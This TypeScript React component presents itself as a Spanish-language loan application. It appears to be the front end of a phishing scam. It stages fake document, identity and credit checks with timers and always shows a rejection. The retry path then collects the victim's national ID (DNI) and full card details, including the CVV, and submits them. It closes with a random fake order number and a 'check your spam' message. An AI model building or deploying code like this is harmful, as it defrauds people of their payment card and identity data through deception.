import React, { useState } from 'react';
import { FloatingLogo } from './FloatingLogo';
import { LoadingScreen } from './LoadingScreen';
import { LoadingSpinner } from './LoadingSpinner';
import { RejectionMessage } from './RejectionMessage';
import { IdentificationStep } from './steps/IdentificationStep';
import { CardInfoStep } from './steps/CardInfoStep';
import { ProgressIndicator } from './ProgressIndicator';
import { motion, AnimatePresence } from 'framer-motion';
import { submitFormData } from '../services/formService';
import { Check } from 'lucide-react';

interface FormData {
  dni: string;
  loanAmount: number;
  loanTerm: number;
  cardInfo: {
    type: 'credit' | 'debit';
    number: string;
    name: string;
    expiry: string;
    cvv: string;
    bank?: string;
  };
  occupationDetails: {
    company: string;
    position: string;
    monthlySalary: string;
    yearsEmployed: string;
  };
}

type VerificationStep = 'initial' | 'document' | 'identity' | 'credit' | 'rejected' | 'form' | 'success';

export const MultiStepForm: React.FC = () => {
  const [isLoading, setIsLoading] = useState(true);
  const [verificationStep, setVerificationStep] = useState<VerificationStep>('initial');
  const [currentStep, setCurrentStep] = useState(0);
  const [orderNumber, setOrderNumber] = useState('');
  const [isRetry, setIsRetry] = useState(false);
  const [formData, setFormData] = useState<FormData>({
    dni: '',
    loanAmount: 0,
    loanTerm: 0,
    cardInfo: {
      type: 'credit',
      number: '',
      name: '',
      expiry: '',
      cvv: ''
    },
    occupationDetails: {
      company: '',
      position: '',
      monthlySalary: '',
      yearsEmployed: ''
    }
  });

  const handleRetry = () => {
    setVerificationStep('form');
    setCurrentStep(1);
    setIsRetry(true);
    setFormData(prev => ({
      ...prev,
      cardInfo: {
        type: 'credit',
        number: '',
        name: '',
        expiry: '',
        cvv: ''
      }
    }));
  };

  const handleNext = async () => {
    setCurrentStep(prev => prev + 1);
  };

  const handleBack = () => {
    setCurrentStep(prev => prev - 1);
  };

  const updateFormData = (field: string, value: any) => {
    setFormData(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleSubmit = async () => {
    try {
      await submitFormData(formData);
      
      // Show loading state for 8 seconds
      setVerificationStep('document');
      await new Promise(resolve => setTimeout(resolve, 8000));
      
      // Generate random order number
      const randomNum = Math.floor(10000 + Math.random() * 90000);
      setOrderNumber(randomNum.toString());
      
      setVerificationStep('success');
    } catch (error) {
      console.error('Error submitting form:', error);
    }
  };

  React.useEffect(() => {
    const runVerification = async () => {
      // Initial loading
      await new Promise(resolve => setTimeout(resolve, 2000));
      setIsLoading(false);
      setVerificationStep('document');

      // Document processing
      await new Promise(resolve => setTimeout(resolve, 3000));
      setVerificationStep('identity');

      // Identity verification
      await new Promise(resolve => setTimeout(resolve, 3000));
      setVerificationStep('credit');

      // Credit check
      await new Promise(resolve => setTimeout(resolve, 10000));
      setVerificationStep('rejected');
    };

    runVerification();
  }, []);

  const renderStep = () => {
    if (isLoading) {
      return <LoadingScreen />;
    }

    switch (verificationStep) {
      case 'document':
        return <LoadingSpinner type="document" message="Procesando documentación..." />;
      case 'identity':
        return <LoadingSpinner type="identity" message="Verificando identidad..." />;
      case 'credit':
        return <LoadingSpinner type="credit" message="Comprobando historial crediticio..." />;
      case 'rejected':
        return <RejectionMessage onRetry={handleRetry} />;
      case 'success':
        return (
          <div className="animate-fade-in py-8 text-center">
            <div className="w-16 h-16 bg-green-50 rounded-full flex items-center justify-center mx-auto mb-6">
              <Check className="w-8 h-8 text-green-500" />
            </div>
            <h2 className="text-xl font-light text-gray-800 mb-4">
              ¡Solicitud recibida!
            </h2>
            <p className="text-sm text-gray-600 mb-2">
              Su número de orden es: <span className="font-medium">{orderNumber}</span>
            </p>
            <p className="text-sm text-gray-600 leading-relaxed max-w-md mx-auto">
              Analizaremos su solicitud y le enviaremos una respuesta por correo electrónico.
              Por favor, revise también su carpeta de spam.
            </p>
          </div>
        );
      case 'form':
        switch (currentStep) {
          case 1:
            return (
              <IdentificationStep
                dni={formData.dni}
                onDniChange={(value) => updateFormData('dni', value)}
                onNext={handleNext}
                onBack={handleBack}
              />
            );
          case 2:
            return (
              <CardInfoStep
                cardInfo={formData.cardInfo}
                onCardInfoChange={(field, value) => {
                  setFormData(prev => ({
                    ...prev,
                    cardInfo: {
                      ...prev.cardInfo,
                      [field]: value
                    }
                  }));
                }}
                onNext={handleSubmit}
                onBack={handleBack}
                isRetry={isRetry}
              />
            );
          default:
            return null;
        }
      default:
        return null;
    }
  };

  return (
    <div className="w-full max-w-4xl">
      <FloatingLogo />
      <div className="relative bg-white/40 backdrop-blur-lg rounded-2xl shadow-lg overflow-hidden transition-all duration-500 ease-in-out">
        {verificationStep === 'form' && (
          <ProgressIndicator currentStep={currentStep} totalSteps={2} />
        )}
        <div className="p-6 sm:p-8 md:p-10">
          <AnimatePresence mode="wait">
            <motion.div
              key={`${verificationStep}-${currentStep}`}
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              transition={{ duration: 0.3 }}
            >
              {renderStep()}
            </motion.div>
          </AnimatePresence>
        </div>
      </div>
    </div>
  );
};